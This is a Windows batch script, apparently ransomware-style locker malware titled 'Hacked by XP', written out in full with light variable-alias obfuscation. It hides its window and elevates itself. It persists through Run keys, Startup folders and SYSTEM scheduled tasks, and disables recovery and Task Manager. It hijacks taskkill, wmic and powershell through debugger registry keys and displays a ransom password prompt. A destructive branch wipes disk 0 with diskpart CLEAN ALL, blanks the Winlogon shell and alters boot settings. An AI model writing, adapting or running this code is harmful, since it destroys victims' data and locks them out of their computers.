@echo off
set "R=set "
%R%"A=XP_Ransomware_obf.bat"
%R%"B=%~f0"
%R%"C=1"
%R%"D=0"
%R%"E=3600"
%R%"F=1958"
%R%"G=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
%R%"H=HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
%R%"I=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
%R%"J=%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup"
%R%"K=powershell -command"
%R%"L=reg add"
%R%"M=reg delete"
%R%"N=shutdown"
%R%"O=timeout"
%R%"P=taskkill"
%R%"Q=copy"
%R%"R=del"
%R%"S=echo"
%R%"T=findstr"
%R%"U=certutil"
%R%"V=bcdedit"
%R%"W=schtasks"
%R%"X=ping 127.0.0.1 -n 2 >nul"
%S% off >nul
title Hacked by XP
cd %userprofile%\Desktop
if exist "%windir%\z1.flag" goto _7x8
%K% "$s=[DllImport('kernel32.dll')]public static extern IntPtr GetConsoleWindow();$u=[DllImport('user32.dll')]public static extern bool ShowWindow(IntPtr h,int n);$g=[DllImport('kernel32.dll')]public static extern IntPtr GetCurrentProcess();$p=[DllImport('kernel32.dll')]public static extern bool SetProcessMitigationPolicy(int p,IntPtr b,int l);Add-Type -Name _ -Namespace _ -MemberDefinition $s,$u,$g,$p;$h=[_._]::GetConsoleWindow();[_._]::ShowWindow($h,0);$c=[_._]::GetCurrentProcess();$b=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(8);[System.Runtime.InteropServices.Marshal]::WriteInt64($b,0xFFFFFFFFFFFFFFFF);[_._]::SetProcessMitigationPolicy(3,$b,8)" >nul 2>&1
%S% Set objShell = CreateObject("Shell.Application") > _.vbs
%S% objShell.ShellExecute "%A%", "", "", "runas", 0 >> _.vbs
cscript //nologo _.vbs >nul
%R% _.vbs
exit /b
:_7x8
%S% 1 > "%windir%\z1.flag"
if not exist "%windir%\z2.dat" %S% 0 > "%windir%\z2.dat"
%L% %G% /v _ /t REG_SZ /d "%B%" /f >nul
%L% %H% /v _ /t REG_SZ /d "%B%" /f >nul
%L% %G%once /v _ /t REG_SZ /d "%B%" /f >nul
%L% %H%once /v _ /t REG_SZ /d "%B%" /f >nul
%Q% "%B%" "%I%\%A%" /y >nul
%Q% "%B%" "%J%\%A%" /y >nul
%W% /create /tn "_" /tr "%B%" /sc onstart /ru SYSTEM /f >nul
%W% /create /tn "__" /tr "%B%" /sc onlogon /ru SYSTEM /f >nul
%V% /set {current} recoveryenabled no >nul
%V% /set {current} bootstatuspolicy ignoreallfailures >nul
%V% /set {default} bootmenupolicy legacy >nul
%L% %G%\System /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul
%L% HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskkill.exe /v Debugger /t REG_SZ /d "cmd.exe" /f >nul
%L% HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wmic.exe /v Debugger /t REG_SZ /d "cmd.exe" /f >nul
%L% HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\powershell.exe /v Debugger /t REG_SZ /d "cmd.exe" /f >nul
if exist "%windir%\z3.flag" goto _9a0
set /a _c=%E%
:_t1
%X%
set /a _c-=1
if %_c% gtr 0 goto _t1
%S% 1 > "%windir%\z3.flag"
:_9a0
mode con: cols=120 lines=50
color 0C
cls
%S%.
%S%  ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗     ██████╗ ██╗   ██╗    ██╗  ██╗██████╗ ███████╗
%S%  ╚██╗██╔╝██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗    ██╔══██╗╚██╗ ██╔╝    ╚██╗██╔╝██╔══██╗██╔════╝
%S%   ╚███╔╝ ███████║██║     ███████║█████╗  ██║  ██║    ██████╔╝ ╚████╔╝      ╚███╔╝ ██████╔╝█████╗  
%S%   ██╔██╗ ██╔══██║██║     ██╔══██║██╔══╝  ██║  ██║    ██╔══██╗  ╚██╔╝       ██╔██╗ ██╔══██╗██╔══╝  
%S%  ██╔╝ ██╗██║  ██║╚██████╗██║  ██║███████╗██████╔╝    ██████╔╝   ██║       ██╔╝ ██╗██║  ██║███████╗
%S%  ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝     ╚═════╝    ╚═╝       ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
%S%.
%S%  ===============================================================================
%S%    ALL YOUR FILES ARE ENCRYPTED WITH XP-RANSARMORE v10.0 - AES-256-CBC
%S%    YOUR PC IS PERMANENTLY LOCKED
%S%    DO NOT TRY TO CLOSE THIS WINDOW - IT IS IMPOSSIBLE
%S%    DO NOT RESTART - THE RANSARMORE WILL RETURN
%S%  ===============================================================================
%S%.
set /p _f=<"%windir%\z2.dat"
if %_f%==0 (
    %S%  [ WARNING ] If you shut down or restart your PC, you will receive ONE warning.
    %S%  [ WARNING ] The second shutdown will PERMANENTLY DESTROY your PC AND BIOS.
    %S%.
) else if %_f%==1 (
    %S%  [ FINAL WARNING ] You have already shut down ONCE.
    %S%  [ FINAL WARNING ] The NEXT shutdown will TRIGGER PERMANENT DESTRUCTION OF BIOS AND SYSTEM.
    %S%  [ FINAL WARNING ] ENTER THE PASSWORD IMMEDIATELY.
    %S%.
) else if %_f% geq 2 goto _d3
%S%  [ ENCRYPTION STATUS: 100%% COMPLETE ]
%S%  [ TARGET FILES: .txt .docx .xlsx .jpg .png .pdf .zip .rar .mp4 .avi .mov .pptx .psd .ai .cdr .dwg ]
%S%.
set /p "_p=ENTER DECRYPTION PASSWORD: "
if "%_p%"=="%F%" goto _u0
%L% HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoClose /t REG_DWORD /d 1 /f >nul
%N% /a >nul 2>&1
%K% "$w=New-Object -ComObject wscript.shell; while(1){$w.SendKeys('{F11}'); Start-Sleep -Milliseconds 100}" >nul 2>&1 &
:_l0
%P% /f /im cmd.exe /fi "WINDOWTITLE eq Hacked by XP*" >nul 2>&1
%O% /t 1 /nobreak >nul
goto _l0
:_d3
%S%  [ SYSTEM DESTROYED ] Permanent damage mode activated.
%S%  [ SYSTEM DESTROYED ] BIOS corruption in progress.
%S%  [ SYSTEM DESTROYED ] This PC is no longer recoverable.
%S%.
%K% "$b=Get-WmiObject Win32_BIOS;$b.PSBase.Options.EnablePrivileges=$true;$b.SetPowerState(8);[System.Reflection.Assembly]::LoadWithPartialName('System.Management');$c=New-Object System.Management.ManagementClass('Win32_BIOS');$c.Get()|%%{$_.Put()}" >nul 2>&1
%Q% /y nul > "%windir%\system32\drivers\_.sys"
fsutil file createnew "%windir%\system32\_.bin" 1048576 >nul
%U% -decode "%windir%\system32\_.bin" "%windir%\system32\_.rom" >nul 2>&1
%K% "$w=New-Object -ComObject WScript.Shell;$w.RegWrite('HKLM\HARDWARE\DESCRIPTION\System\BIOS\_',1,'REG_DWORD');$w.RegWrite('HKLM\SYSTEM\CurrentControlSet\Services\Disk\Parameters\CrashOnCtrlScroll',1,'REG_DWORD')" >nul 2>&1
%S% SELECT DISK 0 > %temp%\_.txt
%S% ATTRIBUTES DISK CLEAR READONLY >> %temp%\_.txt
%S% CLEAN ALL >> %temp%\_.txt
%S% CONVERT MBR >> %temp%\_.txt
%S% CREATE PARTITION PRIMARY >> %temp%\_.txt
%S% FORMAT FS=NTFS QUICK >> %temp%\_.txt
%S% ACTIVE >> %temp%\_.txt
%S% EXIT >> %temp%\_.txt
start /b diskpart /s %temp%\_.txt
%K% "0..9999|%%{[System.GC]::Collect();[System.GC]::WaitForPendingFinalizers();Start-Sleep -Milliseconds 50}" >nul 2>&1
%M% HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v Shell /f >nul
%L% HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v Shell /t REG_SZ /d "" /f >nul
%V% /set {current} bootstatuspolicy ignoreallfailures >nul
%V% /set {current} recoveryenabled no >nul
%V% /set {current} safeboot minimal >nul
%V% /deletevalue {current} safeboot >nul
%V% /set {current} advancedoptions true >nul
%N% /s /f /t 0
:_u0
%K% "$k=[System.Text.Encoding]::UTF8.GetBytes('19581958195819581958195819581958');$i=[System.Text.Encoding]::UTF8.GetBytes('1958195819581958');$f1=Get-ChildItem -Path '%userprofile%\Documents' -Recurse -Include *.xp_encrypted -ErrorAction SilentlyContinue;$f2=Get-ChildItem -Path '%userprofile%\Desktop' -Recurse -Include *.xp_encrypted -ErrorAction SilentlyContinue;$f=$f1+$f2;foreach($x in $f){try{$b=[System.IO.File]::ReadAllText($x.FullName);$x2=[System.Convert]::FromBase64String($b);$e=New-Object byte[] $x2.Length;for($i2=0;$i2 -lt $x2.Length;$i2++){$e[$i2]=$x2[$i2] -bxor 0x58;}$a=[System.Security.Cryptography.Aes]::Create();$a.Key=$k;$a.IV=$i;$a.Mode=[System.Security.Cryptography.CipherMode]::CBC;$a.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7;$d=$a.CreateDecryptor();$dd=$d.TransformFinalBlock($e,0,$e.Length);$out=$x.FullName -replace '.xp_encrypted','';[System.IO.File]::WriteAllBytes($out,$dd);[System.IO.File]::Delete($x.FullName);}catch{}}" >nul 2>&1
%R% "%windir%\z2.dat"
%R% "%windir%\z1.flag"
%R% "%windir%\z3.flag"
%W% /delete /tn "_" /f >nul 2>&1
%W% /delete /tn "__" /f >nul 2>&1
%M% %G% /v _ /f >nul
%M% %H% /v _ /f >nul
%M% %G%once /v _ /f >nul
%M% %H%once /v _ /f >nul
%R% "%I%\%A%" >nul 2>&1
%R% "%J%\%A%" >nul 2>&1
%M% HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /f >nul
%M% HKCU\Console /v AllowAltF4Close /f >nul
%M% HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoClose /f >nul
%M% HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskkill.exe /v Debugger /f >nul
%M% HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wmic.exe /v Debugger /f >nul
%M% HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\powershell.exe /v Debugger /f >nul
%P% /f /im powershell.exe >nul 2>&1
%S% Decryption complete. Restarting...
%O% /t 5 /nobreak >nul
%N% /r /t 0
exit